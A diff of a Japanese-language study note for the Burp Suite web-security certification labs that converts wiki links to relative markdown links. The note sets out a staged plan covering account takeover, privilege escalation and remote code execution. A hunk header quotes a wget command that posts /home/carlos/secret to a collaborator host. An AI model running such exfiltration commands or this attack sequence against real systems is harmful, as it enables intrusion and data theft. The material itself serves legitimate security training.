@@ -30,43 +30,43 @@
 ## Stage1: Access any user account
 
 
-- [[#Content discovery]]
-- [[🔍XSS]]
-- [[🔍DOM-based Vuln]]
-- [[🔍Web cache poisoning]]
-- [[🔍HTTP Host header attack]]
-- [[🔍HTTP request smuggling]]
-- [[🔍Authentication]] - 💡Carlosとは限らない
-- [[⚡️Race condition#Stage1]]
+- [🔍 Recon](🔍%20Recon.md#Content%20discovery)
+- [🔍XSS](../Client-side/XSS/🔍XSS.md)
+- [🔍DOM-based Vuln](../Client-side/DOM-based%20vuln/🔍DOM-based%20Vuln.md)
+- [🔍Web cache poisoning](../Advanced/Web%20cache%20poisoning/🔍Web%20cache%20poisoning.md)
+- [🔍HTTP Host header attack](../Advanced/HTTP%20Host%20header%20attacks/🔍HTTP%20Host%20header%20attack.md)
+- [🔍HTTP request smuggling](../Advanced/Request%20smuggling/🔍HTTP%20request%20smuggling.md)
+- [🔍Authentication](../Server-side/Authentication/🔍Authentication.md) - 💡Carlosとは限らない
+- [⚡️Race condition](../Server-side/Race%20conditions/⚡️Race%20condition.md#Stage1)
 
 ---
 ## Stage2: PrivEsc / `administrator`アカウント漏洩
 
-- [[🔍CSRF]]
-- [[⚡️Password reset]]
-- [[🔍SQLi - Automated]]
-- [[🔍NoSQLi]]
-- [[⚡️JWT]]
-- [[🔍OAuth]]
-- [[⚡️Prototype Pollution]]
-- [[🔍Access control]]
-- [[🔍GraphQL API vuln]]
-- [[🔍 Insecure deserialization]] - データ型操作によるアカウント窃取のみ
-- [[⚡️Race condition#Stage2]]
-- [[🔍API testing]] - 優先度低め。APIエンドポイント検出時に検討 or 手詰まりの時にSSPPを検討
-- CORS([[4. CORS設定の不備による脆弱性とその悪用]]) - ほぼあり得ない
+- [🔍CSRF](../Client-side/CSRF/🔍CSRF.md)
+- [⚡️Password reset](../Server-side/Authentication/⚡️Password%20reset.md)
+- [🔍SQLi - Automated](../Server-side/SQLi/🔍SQLi%20-%20Automated.md)
+- [🔍NoSQLi](../Server-side/NoSQLi/🔍NoSQLi.md)
+- [⚡️JWT](../Advanced/JWT%20attacks/⚡️JWT.md)
+- [🔍OAuth](../Advanced/OAuth/🔍OAuth.md)
+- [⚡️Prototype Pollution](../Advanced/Prototype%20pullution/⚡️Prototype%20Pollution.md)
+- [🔍Access control](../Server-side/Access%20control/🔍Access%20control.md)
+- [🔍GraphQL API vuln](../Advanced/GraphQL%20API%20vuln/🔍GraphQL%20API%20vuln.md)
+- [🔍 Insecure deserialization](../Advanced/Insecure%20deserialization/🔍%20Insecure%20deserialization.md) - データ型操作によるアカウント窃取のみ
+- [⚡️Race condition](../Server-side/Race%20conditions/⚡️Race%20condition.md#Stage2)
+- [🔍API testing](../Server-side/API%20testing/🔍API%20testing.md) - 優先度低め。APIエンドポイント検出時に検討 or 手詰まりの時にSSPPを検討
+- CORS([4. CORS設定の不備による脆弱性とその悪用](../Client-side/CORS/4.%20CORS設定の不備による脆弱性とその悪用.md)) - ほぼあり得ない
 
 ---
 ## Stage3: RCE / ローカルファイル窃取(`/home/carlos/secret`)
 
-- [[⚡️Prototype Pollution]] - Server-side 
-- [[🔍XXEi]]
-- [[🔍SSRF]]
-- [[🔍SSTI]]
-- [[🔍Path traversal]]
-- [[⚡️File upload vuln]]
-- [[🔍 Insecure deserialization]]
-- [[🔍Command Injection]]
+- [⚡️Prototype Pollution](../Advanced/Prototype%20pullution/⚡️Prototype%20Pollution.md) - Server-side 
+- [🔍XXEi](../Server-side/XXE%20injection/🔍XXEi.md)
+- [🔍SSRF](../Server-side/SSRF/🔍SSRF.md)
+- [🔍SSTI](../Advanced/Server-side%20template%20injection/🔍SSTI.md)
+- [🔍Path traversal](../Server-side/Path%20traversal/🔍Path%20traversal.md)
+- [⚡️File upload vuln](../Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md)
+- [🔍 Insecure deserialization](../Advanced/Insecure%20deserialization/🔍%20Insecure%20deserialization.md)
+- [🔍Command Injection](../Server-side/Command%20Injection/🔍Command%20Injection.md)
 
 💡secret窃取用OSコマンド
 ```zsh
@@ -76,15 +76,15 @@ wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret
 ---
 #### Misc
 
-- ⭐️[[Web攻撃の難読化]]
-- [[⚡️Business logic vuln]]: 重要な考え方のようなもの
-- Web LLM - 1/30に登場なので試験に出ない可能性大。もしAIとのchat機能があるなら[[1. Web LLM attackの基本と対策]]
--  [[Clickjacking]]: 優先度はかなり低い
+- ⭐️[Web攻撃の難読化](../../OSCP/Cheatsheet/Stealth&Evasion/Web攻撃の難読化.md)
+- [⚡️Business logic vuln](../Server-side/Business%20logic%20vuln/⚡️Business%20logic%20vuln.md): 重要な考え方のようなもの
+- Web LLM - 1/30に登場なので試験に出ない可能性大。もしAIとのchat機能があるなら[1. Web LLM attackの基本と対策](../Advanced/Web%20LLM%20attacks/1.%20Web%20LLM%20attackの基本と対策.md)
+-  [Clickjacking](../Client-side/Clickjacking.md): 優先度はかなり低い
 
 ---
 ## Content discovery
 
-###### 1. Engagement Toolsの[[Burp Suite Professional Editionの機能#Discover content]]を実行する
+###### 1. Engagement Toolsの[Burp Suite Professional Editionの機能](../Misc/Burp%20Suite%20Professional%20Editionの機能.md#Discover%20content)を実行する
 
 - wordlistは以下にある
 ```
@@ -95,17 +95,17 @@ wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret
 
 ###### 2. 隠されたエンドポイントの検出
 
-- `GET /`に対して、[[🔍Information disclosure ・ Access control ・ GraphQL]]のwordlistで興味深いエンドポイントをbrute-force
+- `GET /`に対して、[🔍Information disclosure ・ Access control ・ GraphQL](../Server-side/Access%20control/🔍Information%20disclosure%20・%20Access%20control%20・%20GraphQL.md)のwordlistで興味深いエンドポイントをbrute-force
 
 if
-- `/.git`エンドポイント: [[3. 一般的な情報開示ソース#バージョン管理履歴]]でパスワードを抽出
+- `/.git`エンドポイント: [3. 一般的な情報開示ソース](../Server-side/Information%20disclosure/3.%20一般的な情報開示ソース.md#バージョン管理履歴)でパスワードを抽出
 - `/admin`エンドポイントに`TRACE`メソッドが使用可能-> [Github: cheatsheet: Trace to Admin](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#trace-to-admin)
-- Error: `Query not present` -> [[🔍GraphQL API vuln]]
+- Error: `Query not present` -> [🔍GraphQL API vuln](../Advanced/GraphQL%20API%20vuln/🔍GraphQL%20API%20vuln.md)
 
 ###### 3. Param Miner -> Guess Headers
 
 - `GET /`に対して走らせる
-- [[🔍HTTP Host header attack]]や[[🔍Web cache poisoning]]に使用可能なヘッダが検出できるかも
+- [🔍HTTP Host header attack](../Advanced/HTTP%20Host%20header%20attacks/🔍HTTP%20Host%20header%20attack.md)や[🔍Web cache poisoning](../Advanced/Web%20cache%20poisoning/🔍Web%20cache%20poisoning.md)に使用可能なヘッダが検出できるかも
 	- Guess everythingは非推奨。時間が10分程かかる
 	- Param Minerを停止させるときはUnload × loadを複数回繰り返す(うまく動作しなくなることがある)
 ###### 4. 一通りアプリを探索した後、Engagement ToolsのFind commentsを実行する& Targetで興味深いページがないか確認
